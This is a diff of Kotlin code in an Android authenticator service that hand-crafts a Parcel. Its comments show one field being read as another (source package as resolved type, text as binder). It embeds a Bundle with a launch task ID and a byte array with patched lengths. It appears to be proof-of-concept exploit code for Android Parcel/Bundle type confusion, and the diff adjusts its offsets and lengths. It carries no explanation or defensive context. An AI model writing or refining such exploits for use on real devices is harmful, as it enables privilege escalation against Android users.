@@ -31,6 +31,7 @@ class Authenticator : Service() {
         val tail = Parcel.obtain().apply {
           writeString(null) // mSourcePackage => resolvedType
           writeInt(0) // labelRes  => hdr
+
           writeInt(0) // kind1 => flags
           writeString8("AAA") // text => binder
           writeInt(11) // alignment => cookie.1
@@ -46,23 +47,25 @@ class Authenticator : Service() {
             writeInt(0) // p.90 => profilerInfo(null)
             run {
               writeInt(1) // options != null
-              writeInt(fixme(100 + 72)) // back patch length
+
+              writeInt(fixme(172)) // back patch length
               writeInt(Const.BundleMagic) // 'B' 'N' 'D' 'L'
+
               writeInt(2) // entry count
               writeString("android.activity.launchTaskId") // key 1
               writeValue(taskId) // value 1
               writeString("_") // key 2
               run {  // value 2
-                writeInt(13) // VAL_BYTEARRAY
-                writeInt(fixme(70 + 72)) // byte array length
-                writeInt('@'.code)
-                writeInt(0) // nil
+                writeInt(Const.ValByteArray) // VAL_BYTEARRAY
+                writeInt(fixme(80)) // byte array length
+                writeInt('@'.code) //  0
+                writeInt(0)
               }
             }
 
-            writeInt(0) // span.start
-            writeInt(1) // span.end
-            writeInt(0) // span.flags
+            writeInt(1) // span.start
+            writeInt(2) // span.end
+            writeInt(3) // span.flags
             writeInt(0) // end flag
           }
           writeInt(0) // Icon
